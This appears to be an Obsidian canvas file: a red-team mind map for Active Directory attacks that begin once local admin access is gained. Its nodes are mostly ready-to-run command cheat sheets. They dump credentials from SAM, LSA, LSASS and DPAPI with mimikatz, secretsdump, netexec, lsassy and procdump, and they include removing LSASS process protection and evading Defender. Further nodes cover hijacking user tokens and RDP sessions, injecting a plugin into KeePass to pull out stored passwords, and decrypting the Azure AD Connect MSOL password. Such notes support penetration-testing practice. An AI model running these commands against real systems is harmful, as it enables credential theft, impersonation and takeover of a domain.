{
	"nodes":[
		{"id":"fab9419f4c11882b","type":"group","x":-600,"y":-1040,"width":3760,"height":6600,"color":"#ff78ff","label":"GOT LOCAL ADMIN"},
		{"id":"7f6e710b4b2ddc23","type":"group","x":3680,"y":525,"width":1080,"height":766,"color":"2","label":"CRACKING HASH"},
		{"id":"e7cf4c30b632199a","type":"group","x":3680,"y":4340,"width":1080,"height":763,"color":"1","label":"GOT DOMAIN ADMIN ACCESS"},
		{"id":"4f87af3ce9fdb8dc","type":"group","x":-1840,"y":1880,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"1237926c096a3805","type":"group","x":3680,"y":-420,"width":1080,"height":760,"color":"4","label":"GOT CREDENTIALS"},
		{"id":"e518b878370ed707","type":"group","x":3680,"y":1500,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"56591f3f07e64ca9","type":"group","x":3680,"y":2431,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"964e7cd7c289067f","type":"group","x":3680,"y":3431,"width":1080,"height":760,"color":"#1a57ff","label":"GOT USERNAME"},
		{"id":"216eca3f91fea106","type":"text","text":"# 🔥 Extract credentials from SAM \n\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#theory\n\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Impacket's secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\n>- [Impackets reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py)\n\n```shell\n# Dumping through sam\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --sam\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit\"\n# Dumping sam with impackets secretsdump\n⚪ secretsdump.py '<domain>'/'<user>':'<password>'@'<ip>'\n# Dumping Sam and system hive\n🔵 reg save HKLM\\SAM 'sam.hive';  reg save HKLM\\SYSTEM 'system.hive'\n# Dumping sam through impackets reg.py\n⚪ reg.py '<domain>'/'<user>':'<password>'@'<ip>' backup -o '\\\\<smb_ip>\\share'\n# Extract secrets from sam and system\n⚪ secretsdump.py -system 'system' -sam 'sam.hive' 'LOCAL'\n# Dumping through metasploit \nⓂ️ hashdump\n```","x":320,"y":-960,"width":1520,"height":740},
		{"id":"2604160c40c5e703","type":"text","text":"# 🔥 Extract credentials from LSA \n\n\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#theory\n\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Impacket's secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\n>- [Impackets reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py)\n\n```shell\n# Dumping through lsa\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --lsa\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit\"\n# Dumping lsa with impackets secretsdump\n⚪ secretsdump.py '<domain>'/'<user>':'<password>'@'<ip>'\n# Dumping lsa and system hive\n🔵 reg save HKLM\\SAM 'sam.hive';  reg save HKLM\\SYSTEM 'system.hive'\n# Dumping lsa through impackets reg.py\n⚪ reg.py '<domain>'/'<user>':'<password>'@'<ip>' backup -o '\\\\<smb_ip>\\share'\n# Extract secrets from sam and system\n⚪ secretsdump.py -system 'system' -sam 'sam.hive' 'LOCAL'\n# Dumping through metasploit \nⓂ️ hashdump\n```","x":320,"y":-180,"width":1520,"height":744},
		{"id":"09d21e83558458da","type":"text","text":"# 🔥 Impersonation\n\n## Impersonate with ADCS\n\n>[!info] Theory\n>- [«4ksec's blog](https://z4ksec.github.io/posts/masky-release-v0.0.3/)\n\n\n>[!example] Tools\n>- [Masky](https://github.com/Z4kSec/Masky/tree/master)\n\n\n```shell\n⚪ masky - d '<domain>' -u '<user>'  (-p '<password>' || -k || -H '<hash>') -ca '<certificate authority>' '<ip>'\n```\n\n--- \n\n## Impersonate (act on behalf of) \n\n>[!info] Theory\n>- [netexec's logged-on user](https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users)\n>- [Sensepost's blog](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n>- [Metasploit](https://docs.metasploit.com/)\n>- [Zblurx's impersonate-rs](https://github.com/zblurx/impersonate-rs)\n\n\n```shell\n# Impersonate using metasploit module\nⓂ️ use incognito impersonate_token '<domain>'\\\\<user>\n# Using netexec to get logged-on users\n🕷️ nxc smb '<ip>' -u '<localAdmin>' -p '<password>' --loggedon-users\n# Creaing scheduled tasks that runs as impersonated user\n🕷️ nxc smb '<ip>' -u '<localAdmin>' -p '<password>' -M schtask_as -o USER='<logged-on-user>' CMD='<cmd-command>'\n# Impersonate user's token from running process' pid\n🔵 irs.exe list; irs.exe exec -p '<pid>' -c '<command>'\n```\n\n---\n## Impersonate RDP session\n\n>[!info] Theory\n> - [RedTeam notes](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/lateral-movement/t1563-remote-service-session-hijacking/rdp-hijacking)\n\n>[!example] Tools\n>- [psexec.exe](https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec)\n>- [tscon.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)\n\n```shell\n🔵 psexec.exe -s -i cmd\n🔵 query user\n🔵 tscon.exe '<id>' /dest:'<session_name>'\n```","x":320,"y":1420,"width":1520,"height":1520},
		{"id":"0f84ee382df29c2b","type":"text","text":"# 🔥 Extract credentials from LSASS.exe\n\n\n>[!info] Theory \n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass\n\n>[!example] Tools\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Lsassy](https://github.com/login-securite/lsassy)\n>- [ProcDump]([procdump](https://live.sysinternals.com/procdump.exe))\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Try Remove protection on lsass.exe process\n🔵 mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-\" \n```\n\n\n```shell\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit\"\n# Dumping with lsassy python script\n⚪ lsassy -d '<domain>' -u '<user>' -p '<password>' '<ip>'\n# Dumping with netexec through lsassy module\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' -M lsassy\n# Dumping through procdump from sysinternals and with lsass' pid to bypasss defender\n🔵 procdump -accepteula -ma '$lsass_pid' lsass.dmp\n# Dumping Through mimikatz kiwi module in metasploit\nⓂ️ load kiwi creds_all\n```\n","x":322,"y":600,"width":1520,"height":760},
		{"id":"d5c75e5095b6229b","type":"text","text":"# PASS THE HASH","x":1960,"y":955,"width":298,"height":50,"color":"6"},
		{"id":"90fce1131f63ad7a","type":"text","text":"# CLEAR TEXT CREDS","x":1960,"y":1030,"width":360,"height":50,"color":"6"},
		{"id":"c060e524c728e4ae","type":"text","text":"# DOMAIN ADMIN","x":1960,"y":1115,"width":300,"height":50,"color":"1"},
		{"id":"af4a1cad1d79da6c","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":3760,"y":-340,"width":920,"height":600,"color":"4"},
		{"id":"a089c901939f586b","type":"file","file":"ATTACKS/CRACKING HASH.canvas","x":3760,"y":601,"width":920,"height":600,"color":"2"},
		{"id":"b62f6c4eb3d492a4","type":"text","text":"# HASH  FOUND (NT)","x":1960,"y":1995,"width":322,"height":50,"color":"2"},
		{"id":"0142ee6aa262c7a5","type":"text","text":"# PASS THE HASH / TICKET / CERTIFICATE","x":1960,"y":2155,"width":642,"height":50,"color":"6"},
		{"id":"7092fe15d1a4a78c","type":"text","text":"# RDP","x":1960,"y":2235,"width":122,"height":50,"color":"6"},
		{"id":"1a6fc48a3d3e8334","type":"text","text":"# CREDENTIALS FOUND","x":1960,"y":2075,"width":382,"height":50,"color":"4"},
		{"id":"a82c6d70ec4e32c9","type":"text","text":"# ACL /ACE ABUSE","x":1960,"y":2315,"width":302,"height":50,"color":"#1438ff"},
		{"id":"153cde0757c53c7d","type":"text","text":"# MISC\n\n## Find Users\n\n\n>[!example] Tools\n>- [SmbMap](https://github.com/ShawnDEvans/smbmap)\n>- [Keepwn](https://github.com/Orange-Cyberdefense/KeePwn)\n>- [Netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n⚪ smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv\n```\n---\n## Extract Keepass\n\n\n>[!example] Tools\n>- [Keepwn](https://github.com/Orange-Cyberdefense/KeePwn)\n\n```shell\n⚪ KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t '<target>' --plugin KeeFarceRebornPlugin.dll\n\n⚪ KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t '<target>'\n```\n\n---\n## Hybrid (Azure AD-Connect) Dump cleartext password of MSOL Account on ADConnect Server\n\n>[!example] Tools\n> - [azuread](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c)\n> - [Netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Using azuread powershell script\n🔵 azuread_decrypt_msol_v2.ps1\n# Using netexec msol module\n🕷️ nxc smb '<ip>' -u '<user>' -p '<password>' -M msol\n```","x":320,"y":2996,"width":1520,"height":1064},
		{"id":"25f8765ff89b4f1c","type":"text","text":"# USER FOUND","x":1958,"y":3471,"width":249,"height":55,"color":"#1438a3"},
		{"id":"3a303fcaf7bb1d36","type":"text","text":"# DCSYNC","x":1958,"y":3631,"width":190,"height":50,"color":"#1438ff"},
		{"id":"248019ceef55017c","type":"text","text":"# CREDENTIALS FOUND","x":1958,"y":3551,"width":384,"height":50,"color":"4"},
		{"id":"46ba70412a222839","type":"text","text":"# Extract credentials from DPAPI\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#theory\n>- https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf\n\n\n>[!example] Tools\n>- [login-securite's Donpapi](https://github.com/login-securite/DonPAPI)\n>- [Ghostpack's SharpDpapi](https://github.com/GhostPack/SharpDPAPI)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Lsassy](https://github.com/login-securite/lsassy)\n\n```shell\n# Dumping dpapi secrets using donpapi\n⚪ donpapi '<domain>'/'<user>':'<password>'@'<target>'\n# Dumping using netexec option --dpapi\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --dpapi 'cookies' --dpapi 'nosystem'\n# Dumping using SharpDPAPI\n⚫ SharpDPAPI.exe triage\n# Dumping using impacket's dpapidump\n⚪ dpapidump.py '<domain>'/'<user>':'<password>'@'<target>'\n```\n\n## Get masterkey\n\n```shell\n# Obtain masterkey mimikatz\n🔵 mimikatz \"sekurlsa::dpapi\"\n# Obtain masterkey using lsassy\n⚪ lsassy -d '<domain>' -u '<user>' -p '<password>' '<ip>' -m rdrleakdiag -M masterkeys\n# Dumping creds twith dploot\n⚪ dploot.py browser -d '<domain>' -u '<user>' -p '<password>' '<ip>' -mkfile '<masterkeys_file>'\n```","x":320,"y":4120,"width":1520,"height":880},
		{"id":"83886351696ed4d1","type":"text","text":"## Cracking Users Masterkey\n\n>[!example] Tools\n>- [DPAPIlmk2John](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)\n\n```shell\n# Remove attribute protection\n🔵 attrib -a -h -s \"C:/Users/<user>/AppData/Roaming/Microsoft/Protect/<SID>/*\"\n# Download folder containing private key file\n🔵 copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID> \n# retrieve masterkey \n⚪ DPAPImk2john.py --preferred '<prefered_file>'\n# Dump masterkey hash\n⚪ DPAPImk2john.py -c 'domain' -mk '<masterkey>' -S '<sid>'\n```","x":1262,"y":5065,"width":1040,"height":420},
		{"id":"5db4d42d4b945734","type":"text","text":"# DPAPI MASTERKEY","x":2362,"y":5250,"width":340,"height":50,"color":"2"},
		{"id":"61ffeb4b782c53b2","type":"text","text":"# CREDENTIALS FOUND","x":1949,"y":4460,"width":380,"height":50,"color":"4"},
		{"id":"60a2771ee71d4abb","type":"text","text":"# PASS THE HASH","x":1949,"y":4535,"width":293,"height":50,"color":"6"},
		{"id":"57db55e13d9fa309","type":"text","text":"# CLEAR TEXT CREDS","x":1949,"y":4620,"width":353,"height":50,"color":"6"},
		{"id":"be0bc8fd1985b33d","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":3760,"y":1582,"width":920,"height":600,"color":"6"},
		{"id":"21ea276be1cd17fe","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":3760,"y":2511,"width":920,"height":600,"color":"#324bff"},
		{"id":"b63f3ab1dbacbd21","type":"file","file":"ATTACKS/GOT USERNAME.canvas","x":3760,"y":3510,"width":920,"height":600,"color":"#1450f0"},
		{"id":"c5b891d4862bf796","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":3760,"y":4420,"width":920,"height":600,"color":"1"},
		{"id":"1f1e49650dff78f3","type":"text","text":"# PASS THE HASH","x":1960,"y":-615,"width":300,"height":50,"color":"6"},
		{"id":"d1c553e67fd5f4b7","type":"text","text":"# HASH  FOUND (NT)","x":1960,"y":-695,"width":340,"height":41,"color":"2"},
		{"id":"c615cecaced1133b","type":"text","text":"# DOMAIN ADMIN","x":1960,"y":-535,"width":300,"height":50,"color":"1"},
		{"id":"34e66c021511ebb2","type":"text","text":"# HASH FOUND (MSCACHE V2)","x":1960,"y":94,"width":480,"height":50,"color":"2"},
		{"id":"20acccfbd84b5a4f","type":"text","text":"# CREDENTIALS FOUND","x":1960,"y":167,"width":378,"height":50,"color":"4"},
		{"id":"c8c9682f06cbaac9","type":"text","text":"# DOMAIN ADMIN","x":1960,"y":247,"width":300,"height":50,"color":"1"},
		{"id":"335bbfe6000f4fae","type":"text","text":"# CREDENTIALS FOUND","x":1960,"y":795,"width":380,"height":50,"color":"4"},
		{"id":"0a618c454f356bbd","type":"text","text":"# HASH  FOUND (NT)","x":1960,"y":875,"width":340,"height":50,"color":"2"},
		{"id":"36978ad219fb3afe","type":"text","text":"# GOT LOCAL ADMIN","x":-480,"y":1680,"width":360,"height":81,"color":"#ff78ff"},
		{"id":"4d36e7bd62d779e5","type":"file","file":"INTERACTIVE-MAP.canvas","x":-1760,"y":1960,"width":920,"height":600}
	],
	"edges":[
		{"id":"1be3266bb04b2f91","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"335bbfe6000f4fae","toSide":"left"},
		{"id":"cbd9c65ec51b3f1c","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"0a618c454f356bbd","toSide":"left"},
		{"id":"9d7776dce4cc4d8c","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"d5c75e5095b6229b","toSide":"left"},
		{"id":"1e31a6044281a0ac","fromNode":"216eca3f91fea106","fromSide":"right","toNode":"d1c553e67fd5f4b7","toSide":"left"},
		{"id":"04034c54b38d5242","fromNode":"216eca3f91fea106","fromSide":"right","toNode":"1f1e49650dff78f3","toSide":"left"},
		{"id":"187230de41a9df6d","fromNode":"2604160c40c5e703","fromSide":"right","toNode":"34e66c021511ebb2","toSide":"left"},
		{"id":"4dbaa0ec31c19769","fromNode":"2604160c40c5e703","fromSide":"right","toNode":"20acccfbd84b5a4f","toSide":"left"},
		{"id":"00402a6c44ae9914","fromNode":"4f87af3ce9fdb8dc","fromSide":"right","toNode":"fab9419f4c11882b","toSide":"left"},
		{"id":"e1fdac79f65eb36d","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"0f84ee382df29c2b","toSide":"left"},
		{"id":"77c963d252b82909","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"216eca3f91fea106","toSide":"left"},
		{"id":"0c82596acb00befc","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"2604160c40c5e703","toSide":"left"},
		{"id":"fedfa5c82ffc631c","fromNode":"46ba70412a222839","fromSide":"bottom","toNode":"83886351696ed4d1","toSide":"left"},
		{"id":"ac9c4e78c0fd20b8","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"09d21e83558458da","toSide":"left"},
		{"id":"32fe7a52d880e494","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"153cde0757c53c7d","toSide":"left"},
		{"id":"abe4074ed0eb194e","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"46ba70412a222839","toSide":"left"},
		{"id":"370d61fb6546a429","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"90fce1131f63ad7a","toSide":"left"},
		{"id":"0f359731b0946541","fromNode":"46ba70412a222839","fromSide":"right","toNode":"61ffeb4b782c53b2","toSide":"left"},
		{"id":"be0c31897f74c0d6","fromNode":"46ba70412a222839","fromSide":"right","toNode":"60a2771ee71d4abb","toSide":"left"},
		{"id":"65703defea7a3342","fromNode":"46ba70412a222839","fromSide":"right","toNode":"57db55e13d9fa309","toSide":"left"},
		{"id":"ef6db4227f82bc80","fromNode":"83886351696ed4d1","fromSide":"right","toNode":"5db4d42d4b945734","toSide":"left"},
		{"id":"38c49a68d34a41bd","fromNode":"09d21e83558458da","fromSide":"right","toNode":"b62f6c4eb3d492a4","toSide":"left"},
		{"id":"f87b91c39c653d85","fromNode":"09d21e83558458da","fromSide":"right","toNode":"1a6fc48a3d3e8334","toSide":"left"},
		{"id":"222cfdbab574ac22","fromNode":"09d21e83558458da","fromSide":"right","toNode":"0142ee6aa262c7a5","toSide":"left"},
		{"id":"50db973e74af588a","fromNode":"09d21e83558458da","fromSide":"right","toNode":"7092fe15d1a4a78c","toSide":"left"},
		{"id":"284b5032df24864a","fromNode":"09d21e83558458da","fromSide":"right","toNode":"a82c6d70ec4e32c9","toSide":"left"},
		{"id":"70a7273f885a5acc","fromNode":"153cde0757c53c7d","fromSide":"right","toNode":"248019ceef55017c","toSide":"left"},
		{"id":"f06cdb56764a04be","fromNode":"153cde0757c53c7d","fromSide":"right","toNode":"25f8765ff89b4f1c","toSide":"left"},
		{"id":"2ee07ab0d1da9c3b","fromNode":"153cde0757c53c7d","fromSide":"right","toNode":"3a303fcaf7bb1d36","toSide":"left"},
		{"id":"129d9f7ad47301cf","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"af4a1cad1d79da6c","toSide":"left","color":"4"},
		{"id":"0780b7e19395052b","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"a089c901939f586b","toSide":"left","color":"2"},
		{"id":"8278138d935d4da9","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"be0bc8fd1985b33d","toSide":"left","color":"6"},
		{"id":"33a34cde20586ab3","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"21ea276be1cd17fe","toSide":"left","color":"#324bff"},
		{"id":"5ae0e3f7cb98dd44","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"b63f3ab1dbacbd21","toSide":"left","color":"#1a57ff"},
		{"id":"8cf4f0ee22270a44","fromNode":"fab9419f4c11882b","fromSide":"right","toNode":"c5b891d4862bf796","toSide":"left","color":"1"},
		{"id":"e8478dd3a733cddb","fromNode":"216eca3f91fea106","fromSide":"right","toNode":"c615cecaced1133b","toSide":"left"},
		{"id":"99cce0f2d5ef0f41","fromNode":"2604160c40c5e703","fromSide":"right","toNode":"c8c9682f06cbaac9","toSide":"left"},
		{"id":"d445996e2dd0b8b6","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"c060e524c728e4ae","toSide":"left"}
	]
}